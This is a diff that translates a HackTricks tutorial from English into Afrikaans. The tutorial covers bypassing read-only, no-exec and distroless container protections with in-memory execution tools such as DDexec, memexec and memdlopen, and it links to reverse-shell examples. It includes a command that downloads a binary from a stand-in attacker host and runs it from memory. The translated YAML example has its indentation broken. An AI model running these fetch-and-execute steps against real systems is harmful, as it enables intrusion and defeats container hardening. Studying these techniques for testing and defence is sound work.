@@ -1,78 +1,71 @@
-# Bypass FS protections: read-only / no-exec / Distroless
+# Bypass FS beskerming: lees-slegs / geen-uitvoering / Distroless
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-<figure><img src="../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).
+## Video's
 
-{% embed url="https://www.stmcyber.com/careers" %}
+In die volgende video's kan jy die tegnieke wat op hierdie bladsy genoem word, meer in diepte verduidelik vind:
 
-## Videos
+- [**DEF CON 31 - Verkenning van Linux Geheue Manipulasie vir Stealth en Ontvlugting**](https://www.youtube.com/watch?v=poHirez8jk4)
+- [**Stealth indringings met DDexec-ng & in-geheue dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)
 
-In the following videos you can find the techniques mentioned in this page explained more in depth:
+## lees-slegs / geen-uitvoering scenario
 
-- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
-- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)
-
-## read-only / no-exec scenario
-
-It's more and more common to find linux machines mounted with **read-only (ro) file system protection**, specially in containers. This is because to run a container with ro file system is as easy as setting **`readOnlyRootFilesystem: true`** in the `securitycontext`:
+Dit is al hoe meer algemeen om linux masjiene te vind wat gemonteer is met **lees-slegs (ro) lêerstelsel beskerming**, veral in houers. Dit is omdat dit so maklik is om 'n houer met ro lêerstelsel te laat loop deur **`readOnlyRootFilesystem: true`** in die `securitycontext` in te stel:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
 metadata:
-  name: alpine-pod
+name: alpine-pod
 spec:
-  containers:
-  - name: alpine
-    image: alpine
-    securityContext:
+containers:
+- name: alpine
+image: alpine
+securityContext:
 <strong>      readOnlyRootFilesystem: true
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-However, even if the file system is mounted as ro, **`/dev/shm`** will still be writable, so it's fake we cannot write anything in the disk. However, this folder will be **mounted with no-exec protection**, so if you download a binary here you **won't be able to execute it**.
+However, selfs al is die lêerstelsel as ro gemonteer, sal **`/dev/shm`** steeds skryfbaar wees, so dit is vals dat ons nie iets op die skyf kan skryf nie. Hierdie gids sal egter **gemonteer wees met geen-uitvoering beskerming**, so as jy 'n binêre hier aflaai, sal jy **nie in staat wees om dit uit te voer nie**.
 
 > [!WARNING]
-> From a red team perspective, this makes **complicated to download and execute** binaries that aren't in the system already (like backdoors o enumerators like `kubectl`).
+> Vanuit 'n rooi span perspektief maak dit **moeilik om te aflaai en uit te voer** binêre wat nie reeds in die stelsel is nie (soos agterdeure of enumerators soos `kubectl`).
 
-## Easiest bypass: Scripts
+## Eenvoudigste omseiling: Skrifte
 
-Note that I mentioned binaries, you can **execute any script** as long as the interpreter is inside the machine, like a **shell script** if `sh` is present or a **python** **script** if `python` is installed.
+Let daarop dat ek binêre genoem het, jy kan **enige skrif uitvoer** solank die interpreter binne die masjien is, soos 'n **shell skrif** as `sh` teenwoordig is of 'n **python** **skrif** as `python` geïnstalleer is.
 
-However, this isn't just enough to execute your binary backdoor or other binary tools you might need to run.
+However, dit is nie net genoeg om jou binêre agterdeur of ander binêre gereedskap wat jy mag nodig hê om te loop, uit te voer nie.
 
-## Memory Bypasses
+## Geheue Omseilings
 
-If you want to execute a binary but the file system isn't allowing that, the best way to do so is by **executing it from memory**, as the **protections doesn't apply in there**.
+As jy 'n binêre wil uitvoer maar die lêerstelsel dit nie toelaat nie, is die beste manier om dit te doen deur **dit uit geheue uit te voer**, aangesien die **beskermings daar nie van toepassing is nie**.
 
-### FD + exec syscall bypass
+### FD + exec syscall omseiling
 
-If you have some powerful script engines inside the machine, such as **Python**, **Perl**, or **Ruby** you could download the binary to execute from memory, store it in a memory file descriptor (`create_memfd` syscall), which isn't going to be protected by those protections and then call a **`exec` syscall** indicating the **fd as the file to execute**.
+As jy 'n paar kragtige skrif enjin in die masjien het, soos **Python**, **Perl**, of **Ruby**, kan jy die binêre aflaai om uit geheue uit te voer, dit in 'n geheue lêer beskrywer (`create_memfd` syscall) stoor, wat nie deur daardie beskermings beskerm gaan word nie en dan 'n **`exec` syscall** aanroep wat die **fd as die lêer om uit te voer** aandui.
 
-For this you can easily use the project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). You can pass it a binary and it will generate a script in the indicated language with the **binary compressed and b64 encoded** with the instructions to **decode and decompress it** in a **fd** created calling `create_memfd` syscall and a call to the **exec** syscall to run it.
+Vir hierdie kan jy maklik die projek [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) gebruik. Jy kan dit 'n binêre gee en dit sal 'n skrif in die aangeduide taal genereer met die **binêre gecomprimeer en b64 geënkodeer** met die instruksies om dit te **dekodeer en te dekomprimeer** in 'n **fd** wat geskep is deur `create_memfd` syscall aan te roep en 'n oproep na die **exec** syscall om dit te laat loop.
 
 > [!WARNING]
-> This doesn't work in other scripting languages like PHP or Node because they don't have any d**efault way to call raw syscalls** from a script, so it's not possible to call `create_memfd` to create the **memory fd** to store the binary.
+> Dit werk nie in ander skripting tale soos PHP of Node nie omdat hulle nie enige **standaard manier het om rou syscalls** vanuit 'n skrif aan te roep nie, so dit is nie moontlik om `create_memfd` aan te roep om die **geheue fd** te skep om die binêre te stoor nie.
 >
-> Moreover, creating a **regular fd** with a file in `/dev/shm` won't work, as you won't be allowed to run it because the **no-exec protection** will apply.
+> Boonop sal die skep van 'n **regte fd** met 'n lêer in `/dev/shm` nie werk nie, aangesien jy nie toegelaat sal word om dit uit te voer nie omdat die **geen-uitvoering beskerming** van toepassing sal wees.
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is a technique that allows you to **modify the memory your own process** by overwriting its **`/proc/self/mem`**.
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is 'n tegniek wat jou toelaat om **die geheue van jou eie proses** te verander deur sy **`/proc/self/mem`** te oorskryf.
 
-Therefore, **controlling the assembly code** that is being executed by the process, you can write a **shellcode** and "mutate" the process to **execute any arbitrary code**.
+Daarom, **beheer die assembly kode** wat deur die proses uitgevoer word, kan jy 'n **shellcode** skryf en die proses "mutate" om **enige arbitrêre kode** uit te voer.
 
 > [!TIP]
-> **DDexec / EverythingExec** will allow you to load and **execute** your own **shellcode** or **any binary** from **memory**.
-
+> **DDexec / EverythingExec** sal jou toelaat om jou eie **shellcode** of **enige binêre** van **geheue** te laai en **uit te voer**.
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
-
-For more information about this technique check the Github or:
+Vir meer inligting oor hierdie tegniek, kyk na die Github of:
 
 {{#ref}}
 ddexec.md
@@ -80,45 +73,40 @@ ddexec.md
 
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec) is the natural next step of DDexec. It's a **DDexec shellcode demonised**, so every time that you want to **run a different binary** you don't need to relaunch DDexec, you can just run memexec shellcode via the DDexec technique and then **communicate with this deamon to pass new binaries to load and run**.
+[**Memexec**](https://github.com/arget13/memexec) is die natuurlike volgende stap van DDexec. Dit is 'n **DDexec shellcode demonised**, so elke keer dat jy 'n **ander binêre** wil **hardloop**, hoef jy nie DDexec weer te herlaai nie, jy kan net memexec shellcode via die DDexec-tegniek hardloop en dan **met hierdie demon kommunikeer om nuwe binêre te stuur om te laai en te hardloop**.
 
-You can find an example on how to use **memexec to execute binaries from a PHP reverse shell** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
+Jy kan 'n voorbeeld vind van hoe om **memexec te gebruik om binêre van 'n PHP reverse shell** uit te voer in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
 
 ### Memdlopen
 
-With a similar purpose to DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) technique allows an **easier way to load binaries** in memory to later execute them. It could allow even to load binaries with dependencies.
+Met 'n soortgelyke doel as DDexec, laat die [**memdlopen**](https://github.com/arget13/memdlopen) tegniek 'n **eenvoudiger manier om binêre** in geheue te laai om later uit te voer. Dit kan selfs toelaat om binêre met afhanklikhede te laai.
 
 ## Distroless Bypass
 
-### What is distroless
+### Wat is distroless
 
-Distroless containers contain only the **bare minimum components necessary to run a specific application or service**, such as libraries and runtime dependencies, but exclude larger components like a package manager, shell, or system utilities.
+Distroless houers bevat slegs die **minimale komponente wat nodig is om 'n spesifieke toepassing of diens te laat loop**, soos biblioteke en runtime afhanklikhede, maar sluit groter komponente soos 'n pakketbestuurder, skulp of stelseldienste uit.
 
-The goal of distroless containers is to **reduce the attack surface of containers by eliminating unnecessary components** and minimising the number of vulnerabilities that can be exploited.
+Die doel van distroless houers is om die **aanvaloppervlak van houers te verminder deur onnodige komponente te verwyder** en die aantal kwesbaarhede wat uitgebuit kan word, te minimaliseer.
 
 ### Reverse Shell
 
-In a distroless container you might **not even find `sh` or `bash`** to get a regular shell. You won't also find binaries such as `ls`, `whoami`, `id`... everything that you usually run in a system.
+In 'n distroless houer mag jy **nie eens `sh` of `bash`** vind om 'n gewone skulp te kry nie. Jy sal ook nie binêre soos `ls`, `whoami`, `id`... vind nie, alles wat jy gewoonlik in 'n stelsel hardloop.
 
 > [!WARNING]
-> Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.
+> Daarom, jy **sal nie** in staat wees om 'n **reverse shell** of **te enumerate** die stelsel soos jy gewoonlik doen nie.
 
-However, if the compromised container is running for example a flask web, then python is installed, and therefore you can grab a **Python reverse shell**. If it's running node, you can grab a Node rev shell, and the same with mostly any **scripting language**.
-
-> [!TIP]
-> Using the scripting language you could **enumerate the system** using the language capabilities.
-
-If there is **no `read-only/no-exec`** protections you could abuse your reverse shell to **write in the file system your binaries** and **execute** them.
+As die gecompromitteerde houer egter 'n flask web loop, dan is python geïnstalleer, en daarom kan jy 'n **Python reverse shell** kry. As dit node loop, kan jy 'n Node rev shell kry, en dieselfde met byna enige **scripting taal**.
 
 > [!TIP]
-> However, in this kind of containers these protections will usually exist, but you could use the **previous memory execution techniques to bypass them**.
+> Deur die scripting taal te gebruik, kan jy **die stelsel enumerate** met behulp van die taal se vermoëns.
 
-You can find **examples** on how to **exploit some RCE vulnerabilities** to get scripting languages **reverse shells** and execute binaries from memory in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+As daar **geen `read-only/no-exec`** beskermings is nie, kan jy jou reverse shell misbruik om **in die lêerstelsel jou binêre** te **skryf** en **uit te voer**.
 
-<figure><img src="../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+> [!TIP]
+> egter, in hierdie soort houers sal hierdie beskermings gewoonlik bestaan, maar jy kan die **vorige geheue-uitvoerings tegnieke gebruik om dit te omseil**.
 
-If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).
+Jy kan **voorbeelde** vind van hoe om **sommige RCE kwesbaarhede te exploiteer** om scripting tale **reverse shells** te kry en binêre van geheue uit te voer in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
-{% embed url="https://www.stmcyber.com/careers" %}
 
 {{#include ../../../banners/hacktricks-training.md}}
